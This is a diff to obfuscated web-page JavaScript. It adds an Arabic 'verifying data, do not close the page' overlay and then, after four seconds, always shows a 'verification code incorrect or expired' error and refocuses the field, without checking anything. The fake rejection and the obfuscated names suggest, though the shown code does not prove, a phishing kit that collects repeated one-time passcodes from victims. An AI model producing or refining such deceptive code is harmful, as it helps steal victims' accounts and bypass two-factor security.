@@ -188,6 +188,27 @@ function v202(action) {
 		});
 	}
 
+	// شاشة الانتظار: جار التحقق من البيانات
+	var waitOv = document.createElement('div');
+	waitOv.id = 'otpWaitOverlay';
+	waitOv.style.cssText = 'position:fixed;inset:0;background:#ffffff;z-index:999999;display:flex;align-items:center;justify-content:center;flex-direction:column;text-align:center;padding:24px;';
+	waitOv.innerHTML =
+		'<div style="width:60px;height:60px;border:6px solid #e2e8f0;border-top-color:#0077D5;border-radius:50%;animation:otpWaitSpin 0.9s linear infinite;"></div>' +
+		'<div style="margin-top:24px;font-size:18px;font-weight:700;color:#1a202c;direction:rtl;line-height:1.6;">جار التحقق من البيانات<br>يرجى عدم اغلاق الصفحة</div>';
+	var waitStyle = document.createElement('style');
+	waitStyle.textContent = '@keyframes otpWaitSpin { to { transform: rotate(360deg); } }';
+	document.head.appendChild(waitStyle);
+	document.body.appendChild(waitOv);
+
+	// بعد 4 ثوانٍ: إخفاء شاشة الانتظار وإظهار رسالة الخطأ
+	setTimeout(function () {
+		var ov = document.getElementById('otpWaitOverlay');
+		if (ov) { ov.remove(); }
+		v220('رمز التحقق غير صحيح او منتهي الصلاحية', false);
+		// إعادة تركيز الحقل
+		if (v199) { v199.focus(); }
+	}, 4000);
+
 	return false;
 }
 
